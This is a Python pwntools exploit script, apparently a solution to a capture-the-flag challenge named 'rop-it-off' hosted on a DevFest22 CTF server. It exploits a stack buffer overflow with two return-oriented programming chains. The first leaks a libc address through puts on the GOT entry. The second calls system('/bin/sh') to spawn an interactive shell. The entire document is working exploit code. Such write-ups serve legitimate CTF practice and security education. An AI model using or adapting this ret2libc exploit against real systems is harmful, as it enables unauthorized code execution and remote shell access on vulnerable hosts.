#!/usr/bin/env python3

from pwn import *

exe = ELF("./rop-it-off")
libc = exe.libc

HOST, PORT = "devfest22-cybersec.gdgalgiers.com", 1401

context.binary = exe
context.terminal = ["tmux", "splitw", "-h", "-p", "75"]

# Constants

GDBSCRIPT = '''\
'''
CHECKING = True

PAD = 40

def main():
    global io

    ropexe = ROP(exe)
    pop_rdi = ropexe.rdi.address
    ret = ropexe.ret.address

    io = conn()

    # ROP to leak libc address
    # equivalent to puts(GOT['puts'])
    payload = flat(
        cyclic(PAD),
        pop_rdi,
        exe.got.puts,
        exe.plt.puts,
        exe.sym.main,
    )
    assert(b"\n" not in payload)
    io.sendlineafter(b"Enter your input: ", payload)
    buf_leak = io.recvline(keepends=False)
    libc.address = leak(buf_leak, libc.sym.puts, "libc")

    # ROP to get a shell
    # equivalent to system("/bin/sh")
    payload = flat(
        cyclic(PAD),
        pop_rdi,
        next(libc.search(b"/bin/sh\0")),
        libc.sym.system,
    )
    assert(b"\n" not in payload)
    io.sendlineafter(b"Enter your input: ", payload)

    io.interactive()

def leak(buf, offset, leaktype, verbose=False):
    verbose and log.info(f"buf: {buf}")
    leak_addr = unpack(buf.ljust(context.bytes, b"\x00"))
    base_addr = leak_addr - offset
    verbose and log.info(f"{leaktype} leak: {leak_addr:#x}")
    log.success(f"{leaktype} base address: {base_addr:#x}")
    return base_addr

def stop():
    io.interactive()
    io.close()
    exit(1)

def check(predicate, disabled=False):
    if not disabled and CHECKING:
        assert(predicate)

def conn():
    if args.REMOTE:
        p = remote(HOST, PORT)
    elif args.GDB:
        p = gdb.debug(exe.path, gdbscript=GDBSCRIPT)
    else:
        p = process(exe.path)

    return p

if __name__ == "__main__":
    io = None
    try:
        main()
    finally:
        if io:
            io.close()
